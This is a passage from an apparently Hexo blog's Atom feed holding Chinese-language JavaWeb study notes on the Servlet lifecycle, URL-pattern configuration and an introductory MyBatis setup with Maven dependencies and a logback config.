&lt;li&gt;Request：&lt;mark&gt;获取&lt;/mark&gt;请求数据&lt;/li&gt;
&lt;li&gt;Response：&lt;mark&gt;设置&lt;/mar</summary>
      
    
    
    
    <category term="JavaWeb" scheme="http://example.com/categories/JavaWeb/"/>
    
    
    <category term="JavaWeb" scheme="http://example.com/tags/JavaWeb/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb-Servlet</title>
    <link href="http://example.com/post/JavaWeb-Servlet.html"/>
    <id>http://example.com/post/JavaWeb-Servlet.html</id>
    <published>2022-06-23T13:39:08.000Z</published>
    <updated>2022-06-23T13:44:15.468Z</updated>
    
    <content type="html"><![CDATA[<ul><li>快速入门</li><li>Servlet 执行流程</li><li>Servlet 生命周期</li><li>Servlet 体系结构</li><li>Servlet URLPattern 配置</li><li>XML 配置方式编写 Servlet</li></ul><h1 id="1-快速入门"><a class="markdownIt-Anchor" href="#1-快速入门">#</a> 1、快速入门</h1><ol><li>创建 web 项目，导入 servlet 依赖坐标</li><li>定义一个类，实现 Servlet 接口，并重写接口中所有方法，并在 service 方法中输入一句话</li><li>在类上使用 @WebServlet 注解，配置该 Servlet 访问路径</li><li>访问：启动 Tomcat，浏览器输入 url 访问 Servlet</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>web</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span><span class="token string">"/demo1"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServletDemo1</span> <span class="token keyword">implements</span> <span class="token class-name">Servlet</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">ServletDemo1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token class-name">Object</span> <span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CloneNotSupportedException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">finalize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">finalize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">ServletConfig</span> servletConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">ServletConfig</span> <span class="token function">getServletConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">service</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Servlet hello World"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getServletInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2-servlet执行流程"><a class="markdownIt-Anchor" href="#2-servlet执行流程">#</a> 2、Servlet 执行流程</h1><ol><li>Servlet 由谁创建？Servlet 由谁调用？<ul><li>Servlet 由 web 服务器创建，Servlet 方法由 web 服务器调用</li></ul></li><li>服务器怎么知道 Servlet 中一定有 Service 方法？<ul><li>因为我们自定义的 Servlet，必须实现 Servlet 接口并复写其方法，而 Servlet 接口中有 service 方法</li></ul></li></ol><h1 id="3-生命周期"><a class="markdownIt-Anchor" href="#3-生命周期">#</a> 3、生命周期</h1><ul><li>对象的生命周期指一个对象从被创建到被销毁的整个过程</li><li>Servlet 运行在 Servlet 容器 (web 服务器) 中，其生命周期由容器来管理，分为 4 个阶段：</li></ul><ol><li><mark>加载和实例化</mark>：默认情况下，当 Servlet 第一次被访问时，由容器创建 Servlet 对象</li></ol><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">默认情况，Servlet会在第一次访问被容器创建，但是如果创建Servlet比较耗时的话，那么第一个访问的人等待的时间就比较长，用户的体验就比较差，那么我们能不能把Servlet的创建放到服务器启动的时候来创建，具体如何来配置?@WebServlet(urlPatterns = "/demo1",loadOnStartup = 1)loadOnstartup的取值有两类情况（1）负整数:第一次访问时创建Servlet对象（2）0或正整数:服务器启动时创建Servlet对象，数字越小优先级越高<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li><mark>初始化</mark>：在 Servlet 实例化之后，容器将调用 Servlet 的<mark> init ()<mark> 方法初始化这个对象，完成一些如加载配置文件、创建连接等初始化的工作。该方法只</mark>调用一次</mark></li><li><mark>请求处理</mark>：<mark>每次</mark>请求 Servlet 时，Servlet 容器都会调用 Servlet 的 ==service ()== 方法对请求进行处理</li><li><mark>服务终止</mark>：当需要释放内存或者容器关闭时，容器就会调用 Servlet 实例的 ==destroy ()== 方法完成资源的释放。在 destroy () 方法调用之后，容器会释放这个 Servlet 实例，该实例随后会被 Java 的垃圾收集器所回收</li></ol><h1 id="4-方法介绍"><a class="markdownIt-Anchor" href="#4-方法介绍">#</a> 4、方法介绍</h1><ul><li>初始化方法，在 Servlet 被创建时执行，只执行一次</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">ServletConfig</span> config<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>提供服务方法，每次 Servlet 被访问，都会调用该方法</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">service</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>销毁方法，当 Servlet 被销毁时，调用该方法，在内存释放或服务器关闭时销毁 Servlet</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">destory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>获取 ServletConfig 对象</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ServletConfig</span> <span class="token function">getServletConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>获取 Servlet 信息</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> <span class="token function">getServletInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="5-servlet体系结构"><a class="markdownIt-Anchor" href="#5-servlet体系结构">#</a> 5、Servlet 体系结构</h1><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623105110152.png" alt="image-20220623105110152"></p><p>我们将来开发 B/S 架构的 web 项目，都是针对 HTTP 协议，所以我们自定义 Servlet，会继承 HttpServlet</p><ul><li>手写 Servlet 实现方法，这个代码</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">service</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//根据请求方式不同进行分别处理</span>    <span class="token class-name">HttpServletRequest</span> request <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> servletRequest<span class="token punctuation">;</span>    <span class="token comment">//1.获取请求方式</span>    <span class="token class-name">String</span> method <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//2.判断</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//get方式的处理逻辑</span>        <span class="token function">doget</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//post方式的处理逻辑</span>        <span class="token function">dopost</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="6-servlet-urlpattern配置"><a class="markdownIt-Anchor" href="#6-servlet-urlpattern配置">#</a> 6、Servlet URLPattern 配置</h1><ul><li>Servlet 想要被访问，必须配置其访问路径 (urlPattern)</li></ul><ol><li>一个 Servlet，可以配置多个 URLPattern<ul><li>@WebServlet(urlPatterns = {&quot;/demo1&quot;, “/demo2”})</li></ul></li><li>URLPattern 配置规则<ul><li>①精确匹配 ②目录匹配 ③扩展名匹配 ④任意匹配</li></ul></li></ol><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623111500801.png" alt="image-20220623111500801"></p><h1 id="7-xml配置servlet"><a class="markdownIt-Anchor" href="#7-xml配置servlet">#</a> 7、XML 配置 Servlet</h1><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>demo13<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>com.itheima.web.ServletDemo13<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>demo13<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/demo13<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;快速入门&lt;/li&gt;
&lt;li&gt;Servlet 执行流程&lt;/li&gt;
&lt;li&gt;Servlet 生命周期&lt;/li&gt;
&lt;li&gt;Servlet 体系结构&lt;/li&gt;
&lt;li&gt;Servlet URLPattern 配置&lt;/li&gt;
&lt;li&gt;XML 配置方式编写 Servlet&lt;/</summary>
      
    
    
    
    <category term="JavaWeb" scheme="http://example.com/categories/JavaWeb/"/>
    
    
    <category term="JavaWeb" scheme="http://example.com/tags/JavaWeb/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb-MyBatis</title>
    <link href="http://example.com/post/JavaWeb-MyBatis.html"/>
    <id>http://example.com/post/JavaWeb-MyBatis.html</id>
    <published>2022-06-23T13:38:28.000Z</published>
    <updated>2022-06-23T13:42:51.159Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-mybatis概述"><a class="markdownIt-Anchor" href="#1-mybatis概述">#</a> 1、Mybatis 概述</h1><h2 id="11-mybatis概念"><a class="markdownIt-Anchor" href="#11-mybatis概念">#</a> 1.1  Mybatis 概念</h2><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><ul><li><p>MyBatis 是一款优秀的<mark>持久层框架</mark>，用于简化 JDBC 开发</p></li><li><p>MyBatis 本是 Apache 的一个开源项目 iBatis, 2010 年这个项目由 apache software foundation 迁移到了 google code，并且改名为 MyBatis 。2013 年 11 月迁移到 Github</p></li><li><p>官网：<a href="https://mybatis.org/mybatis-3/zh/index.html">https://mybatis.org/mybatis-3/zh/index.html</a></p></li></ul></blockquote><p><strong>持久层：</strong></p><ul><li><p>负责将数据到保存到数据库的那一层代码。</p><p>以后开发我们会将操作数据库的 Java 代码作为持久层。而 Mybatis 就是对 jdbc 代码进行了封装。</p></li><li><p>JavaEE 三层架构：<mark>表现层、业务层、持久层</mark></p><p>三层架构在后期会给大家进行讲解，今天先简单的了解下即可。</p></li></ul><p><strong>框架：</strong></p><ul><li>框架就是一个半成品软件，是一套可重用的、通用的、软件基础代码模型</li><li>在框架的基础之上构建软件编写更加高效、规范、通用、可扩展</li></ul><p>举例给大家简单的解释一下什么是半成品软件。大家小时候应该在公园见过给石膏娃娃涂鸦</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726202410311.png" alt="image-20210726202410311" style="zoom:70%;" /><p>如下图所示有一个石膏娃娃，这个就是一个半成品。你可以在这个半成品的基础上进行不同颜色的涂鸦</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726202858441.png" alt="image-20210726202858441" style="zoom:70%;" /><p>了解了什么是 Mybatis 后，接下来说说以前  <code>JDBC代码</code>  的缺点以及 Mybatis 又是如何解决的。</p><h2 id="12-jdbc-缺点"><a class="markdownIt-Anchor" href="#12-jdbc-缺点">#</a> 1.2  JDBC 缺点</h2><p>下面是 JDBC 代码，我们通过该代码分析都存在什么缺点：</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726203656847.png" alt="image-20210726203656847" style="zoom:70%;" /><ul><li><p>硬编码</p><ul><li><p>注册驱动、获取连接</p><p>上图标 1 的代码有很多字符串，而这些是连接数据库的四个基本信息，以后如果要将 Mysql 数据库换成其他的关系型数据库的话，这四个地方都需要修改，如果放在此处就意味着要修改我们的源代码。</p></li><li><p>SQL 语句</p><p>上图标 2 的代码。如果表结构发生变化，SQL 语句就要进行更改。这也不方便后期的维护。</p></li></ul></li><li><p>操作繁琐</p><ul><li><p>手动设置参数</p></li><li><p>手动封装结果集</p><p>上图标 4 的代码是对查询到的数据进行封装，而这部分代码是没有什么技术含量，而且特别耗费时间的。</p></li></ul></li></ul><h2 id="13-mybatis-优化"><a class="markdownIt-Anchor" href="#13-mybatis-优化">#</a> 1.3  Mybatis 优化</h2><ul><li>硬编码可以配置到<mark>配置文件</mark></li><li>操作繁琐的地方 mybatis 都<mark>自动完成</mark></li></ul><p>如图所示</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726204849309.png" alt="image-20210726204849309" style="zoom:80%;" /><p>下图是持久层框架的使用占比。</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726205328999.png" alt="image-20210726205328999" style="zoom:80%;" /><h1 id="2-mybatis快速入门"><a class="markdownIt-Anchor" href="#2-mybatis快速入门">#</a> 2、Mybatis 快速入门</h1><h2 id="21-步骤"><a class="markdownIt-Anchor" href="#21-步骤">#</a> 2.1 步骤</h2><ol><li>创建 User 表，添加数据</li><li>创建模块，导入坐标</li><li>编写 mybatis 核心配置文件 -&gt; 替换连接信息，解决硬编码问题</li><li>编写 SQL 映射文件 -&gt; 统一管理 SQL 语句，解决硬编码问题</li><li>编码<ol><li>定义 pojo 类</li><li>加载核心配置文件，获取 SQLSessionFactory 对象</li><li>获取 SQLSession 对象，执行 SQL 语句</li><li>释放资源</li></ol></li></ol><h2 id="22-详细操作"><a class="markdownIt-Anchor" href="#22-详细操作">#</a> 2.2 详细操作</h2><ol><li>在 pom.xml 中导入相关依赖，logback 和 slf4j 都是用来查看日志的，直接复制</li></ol><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.mybatis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>mybatis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.5.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>mysql<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>mysql-connector-java<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.1.46<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>4.13<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- 添加slf4j日志api --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.slf4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>slf4j-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.7.20<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- 添加logback-classic依赖 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>ch.qos.logback<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>logback-classic<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- 添加logback-core依赖 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>ch.qos.logback<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>logback-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>在 main 的 resources 下创建 logback.xml，内容如下</li></ol><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--        CONSOLE ：表示当前的日志信息是可以输出到控制台的。    --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Console<span class="token punctuation">"</span></span> <span 